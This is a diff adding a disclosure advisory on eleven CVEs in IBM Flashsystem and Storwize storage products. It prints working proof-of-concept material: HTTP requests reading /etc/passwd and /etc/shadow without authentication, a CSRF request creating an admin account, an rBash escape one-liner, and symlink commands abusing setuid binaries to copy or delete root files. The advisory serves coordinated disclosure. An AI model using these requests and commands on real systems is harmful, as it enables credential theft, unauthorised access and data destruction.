@@ -1,0 +1,290 @@
+id: 30354
+date: 05/15/2018
+title: IBM Flashsystem / Storwize CSRF / Arbitrary File Read / Information Disclosure Vulnerabilities
+author: Sebastian Neuner
+cves: CVE-2018-1433, CVE-2018-1434, CVE-2018-1438, CVE-2018-1461, CVE-2018-1462, CVE-2018-1463, CVE-2018-1464, CVE-2018-1465, CVE-2018-1466, CVE-2018-1467, CVE-2018-1495
+
+Vulnerabilities in IBMs Flashsystems and Storwize Products
+-------------------------------------------------------------------------
+
+Introduction
+============
+Vulnerabilities were identified in the IBM Flashsystem 840, IBM Flashsystem
+900 and IBM Storwize V7000. These were discovered during a black box
+assessment and therefore the vulnerability list should not be considered
+exhaustive; observations suggest that it is likely that further
+vulnerabilities exist. It is strongly recommended that IBM Corporation
+undertakes a full whitebox security assessment of this application.
+
+The version under test was indicated as: 1.6.2.2 build 18
+
+Affected Software And Versions
+==============================
+- IBM Flashsystem 900
+- IBM Flashsystem 840
+- IBM Storwize V7000
+
+Affected versions are indicated directly within the reported issues.
+
+CVE
+===
+The following CVEs were assigned to the issues described in this report:
+CVE-2018-1438
+CVE-2018-1433
+CVE-2018-1434
+CVE-2018-1462
+CVE-2018-1463
+CVE-2018-1464
+CVE-2018-1495
+CVE-2018-1467
+CVE-2018-1465
+CVE-2018-1466
+CVE-2018-1461
+
+Vulnerability Overview
+======================
+   01. CVE-2018-1438: Unauthenticated arbitrary file read on V7000 Unified
+allowing storage data access
+   02. CVE-2018-1433: Unauthenticated arbitrary file read via the
+DownloadFile Handler / Authenticated arbitrary file read via the
+DownloadFile Handler on v7000 Unified
+   03. CVE-2018-1434: Web interface vulnerable to CSRF
+   04. CVE-2018-1462: rBash ineffective as a security measure
+   05. CVE-2018-1463: World readable credentials and encryption keys
+   06. CVE-2018-1464: Sensitive file disclosure of files readable by root
+   07. CVE-2018-1495: Arbitrary file overwrite
+   08. CVE-2018-1467: Unauthenticated information disclosure
+   09. CVE-2018-1465: Unprivileged web server process may read SSL private
+key
+   10. CVE-2018-1466: Weak password hashing algorithm used
+   11. CVE-2018-1461: Missing Security Related HTTP Headers
+
+
+Vulnerability Details
+=====================
+
+---------------------------------------------
+CVE-2018-1438. Unauthenticated arbitrary file read on V7000 Unified
+allowing storage data access
+---------------------------------------------
+
+On the IBM V7000 Unified System the web handler /DLSnap does not require
+authentication and allows to read arbitrary files from the system as
+"root", including the data stored in the storage system from the mounted
+shares.
+
+GET /DLSnap?filename=/ibm/<redacted>/secret-file.txt HTTP/1.1
+Host: v7ku01
+Connection: close
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Cache-Control:
+Expires: Wed, 31 Dec 1969 16:00:00 PST
+X-Frame-Options: SAMEORIGIN
+Set-Cookie: SonasSessionID=<redacted>; Path=/; Secure; HttpOnly
+Content-disposition: attachment; filename=secret-file.txt
+Pragma:
+Content-Type: application/octet-stream
+Date: Tue, 16 Jan 2018 11:12:39 GMT
+Connection: close
+Content-Length: 4
+
+42
+
+--------------------------------------------------
+CVE-2018-1433. Unauthenticated file read via the DownloadFile Handler /
+Authenticated arbitrary file read via the DownloadFile Handler on v7000
+Unified
+--------------------------------------------------
+
+
+In case of the following list of products, the DownloadFile handler allows
+unauthenticated file reading under the "webadmin" user:
+IBM Flashsystem 900
+IBM Flashsystem 840
+IBM Storwize V7000
+
+Example request:
+GET /DownloadFile?filename=/etc/passwd HTTP/1.1
+Host: v7k01n02
+Connection: close
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+On the V7000 Unified the same request handler allows reading arbitrary
+files under the "root" user, however authentication is required here:
+GET /DownloadFile?filename=/etc/shadow
+Host: v7ku01
+Connection: close
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: <redacted>
+
+-----------------------------------------------
+CVE-2018-1434: Web interface vulnerable to CSRF
+-----------------------------------------------
+
+The main web interface on the V7000 Unified is vulnerable to CSRF and other
+interfaces seem to be vulnerable as well. This could allow an external
+attacker to execute commands on behalf of a user/administrator of the
+system and potentially also access data stored on the system.
+
+Example request (using a cross domain XMLHttpRequest):
+POST /RPCAdapter HTTP/1.1
+Host: v7ku01
+Origin: https://www.example.com
+Referer: https://www.example.com/create_admin.html
+Content-Type: text/plain
+Connection: close
+Content-Length: 183
+Cookie: <redacted>
+
+{"clazz":"com.ibm.evo.rpc.RPCRequest","methodClazz":"com.ibm.sonas.gui.logic.AccessRPC","methodName":"launchCreateUserTask","methodArgs":["my-secadmin","<redacted>",["Administrator"]]}
+
+
+Response:
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+X-Frame-Options: SAMEORIGIN
+Content-Type: application/json;charset=UTF-8
+Content-Length: 319
+Connection: close
+
+{"clazz":"com.ibm.evo.rpc.RPCResponse","messages":null,"result":{"clazz":"com.ibm.sonas.gui.logic.tasks.access.CreateUserTask","shouldBeScheduled":true,"started":1516202190188,"id":"<redacted>","name":"Create
+User", "state":"Running","status":"Task
+started.","progress":-1,"returnValue": null}}
+
+---------------------------------------------
+CVE-2018-1462: Ineffective rBash Configuration
+---------------------------------------------
+
+On machines with a restricted bash, a possible escape from rBash looks like
+the following:
+BASH_CMDS[escape]=/bin/bash;escape
+
+--------------------------------------------------
+CVE-2018-1463: World readable credentials and encryption keys
+--------------------------------------------------
+
+While some systems have removed the world-read bit from several files and
+directories, more important files which contain application configuration
+details, passwords and secret keys are world readable and sometimes also
+world writable. On the IBM Flash System, this also includes the storage
+encryption key.
+
+# Partial directory listing of /persist/ on the Unified system:
+drwxr-xr-x.  2 root root   4096 Jan 18 01:35 .
+drwxr-xr-x. 29 root root   4096 Aug 15 16:16 ..
+...
+-rw-r--r--.  1 root root  27040 Jan 16 08:28 vpd
+...
+
+# Partial directory listing of /mnt/plfs on the Flash system:
+drwxrwxrwx 4 root  root        0 Dec 31  1969 .
+drwxr-x--x 7 root  root     1024 Jan  8 07:41 ..
+-rw-rw-rw- 1 root  root       24 Oct 24  2016 encryption.key
+
+-----------------------------------------------
+CVE-2018-1464: Sensitive file disclosure of files readable by root
+-----------------------------------------------
+
+The setuid binary svc_copy is a wrapper around the script sw_copy which
+calls cp on the shell.
+
+Creating a symlink to any file, this file can be copied as root to /dumps
+and is world readable/writable (-rw-rw-rw- ):
+
+$ ln -s /etc/shadow /tmp/shadow
+$ ./svc_copy /tmp/shadow /dumps/
+
+The file /dumps/shadow is now world readable with the permissions
+(-rw-rw-rw- )
+
+---------------------------------------------
+CVE-2018-1495: Arbitrary file deletion
+---------------------------------------------
+
+The setuid binary log_cleanup is a wrapper around log_cleanup.py
+
+This binary wipes the directories /dumps or /tmp and has an undocumented
+feature "-s" (delete target of symlink).
+
+The following command deletes an arbitrary file (e.g. /etc/shadow):
+$ ln -s /etc/shadow /tmp/shadow
+$ ./log_cleanup -s
+Select /tmp as target directory to be wiped
+
+--------------------------------------------------
+CVE-2018-1467: Unauthenticated information disclosure
+--------------------------------------------------
+
+Some web handlers on the V7000 Unified expose system configuration without
+authentication which could be used by an attacker to collect vital details
+about the environment.
+
+https://v7ku01/SonasInfoServlet?challenge=1
+CLUSTER_ID=<redacted>;NAME=<redacted>.ibm;PROFILE=V7000
+Unified;SYSTEM_NAME=<redacted>.ibm;mgmt001st001=<redacted>;mgmt002st001=<redacted>;idMapConfig=10000000-299999999,1000000;adHost<redacted>;krbMode=off;domain=<redacted>;idMapRole=master;realm=<redacted>;userName=<redacted>;idMappingMethod=auto;passwordServer=*;AUTH_TYPE=ad;IDMAP_10000000-10999999=ALLOC,ALLOC,auto;IDMAP_11000000-11999999=BUILTIN,S-1-5-32,auto;IDMAP_12000000-12999999=<redacted>,S-1-5-21-<redacted>,auto;IDMAP_13000000-13999999=<redacted>,S-1-5-21-<redacted>,auto;
+CHALLENGE <redacted>
+
+
+-----------------------------------------------
+CVE-2018-1465: Unprivileged web server process may read SSL private key
+-----------------------------------------------
+
+The current private key for the installed SSL certificate on the V7000 FC
+CE Cannister Node is readable by the webadmin user:
+-rw-r----- 1 webadmin 1000 1679 Aug 15 09:47 /dev/server.key
+
+As a result the file can be read through vulnerabilities in the web
+application, e.g. via the DownloadFile handler (see separate issue).
+
+Certificate details:
+Validity: 15 years
+Subject: C=GB, L=Hursley, O=IBM, OU=SSG, CN=2076,
+emailAddress=support@ibm.com
+
+---------------------------------------------
+CVE-2018-1466: Weak password hashing algorithm used
+---------------------------------------------
+
+The root password on the V7000 (CE) FC Cannister and Flash System nodes
+(and probably others, too) are hashed with a weak algorithm (DES) instead
+of the SHA512 which is the system's default according to /etc/login.defs.
+
+--------------------------------------------------
+CVE-2018-1461: Missing Security Related HTTP Headers
+--------------------------------------------------
+
+XSS Protection HTTP Header
+The XSS Filter is a feature that is built into modern web browsers and is
+meant to prevent reflective Cross Site Scripting attacks. This feature can
+be explicitly turned on (and also off) by using the HTTP header
+X-XSS-Protection.
+
+X-Content-Type Header
+To make MIME type confusion attacks harder, the HTTP header
+X-Content-Type-Options can be set. This header prevents trusting the user
+provided MIME type and instead guessing the MIME type of the server
+response.
+
+Author
+======
+The vulnerabilities were discovered by Sebastian Neuner (@sebastian9er) and
+Jan Bee from the Google Security Team.
+
+Timeline
+========
+2018/01/26 - Security report sent to psirt@us.ibm.com with 90 day
+disclosure deadline (2018/04/26).
+2018/01/29 - IBM acknowledges report and starts working on the issues.
+2018/04/13 - IBM requested grace period due to internal patch cycle.
+2018/04/16 - Google granted two week grace period (from 2018/04/26 to
+2018/05/11).
+2018/05/11 - Public disclosure on the Full Disclosure/Bugtraq Mailing List.
+
+#  0day.today [2023-03-23]  #
